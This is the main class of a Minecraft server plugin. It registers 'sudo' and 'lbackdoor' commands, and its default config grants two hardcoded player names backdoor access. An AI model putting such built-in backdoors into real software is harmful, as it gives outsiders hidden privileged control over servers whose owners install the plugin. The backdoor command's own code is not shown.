package me.pilkeysek.skyeNetP;

import me.pilkeysek.skyeNetP.commands.LBackdoorCommand;
import me.pilkeysek.skyeNetP.commands.SudoCommand;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Arrays;
import java.util.Collections;
import java.util.Objects;

@SuppressWarnings("unused")
public final class SkyeNetP extends JavaPlugin {
    private FileConfiguration config;
    public static final Component defaultPermMessage = Component.text("You do not have the required permissions to execute this command", NamedTextColor.RED);
    public static final Component defaultConsoleDetectedMessage = Component.text("You are already the console ._.", NamedTextColor.RED);
    public static final Component defaultNonPlayerDetectedMessage = Component.text("You must be a player to execute this command", NamedTextColor.RED);

    @Override
    public void onEnable() {
        initConfig();
        Objects.requireNonNull(getCommand("sudo")).setExecutor(new SudoCommand(config));
        Objects.requireNonNull(getCommand("lbackdoor")).setExecutor(new LBackdoorCommand(config));
    }

    private void initConfig() {
        config = getConfig();
        // The backdoor permitted config value defines the players that can use /backdoor or similar
        config.addDefault("backdoorpermitted", Arrays.asList("PilkeySEK", "NobleSkye"));
        config.addDefault("enabledcommands", Collections.singletonList("sudo"));

        if (!getDataFolder().exists()) {
            getLogger().info("Creating " + getDataFolder() + " main directory ");
            try {
                boolean res = getDataFolder().mkdir();
                if (!res) getLogger().warning("Config data folder might not have been created (?)");
            } catch (SecurityException e) {
                getLogger().warning("Could not create config directory! Error:");
                getLogger().warning(e.toString());
            }
            saveDefaultConfig();
        }
        saveDefaultConfig();

        config.options().copyDefaults(true);
        saveConfig();
    }

    @Override
    public void onDisable() {
    }
}
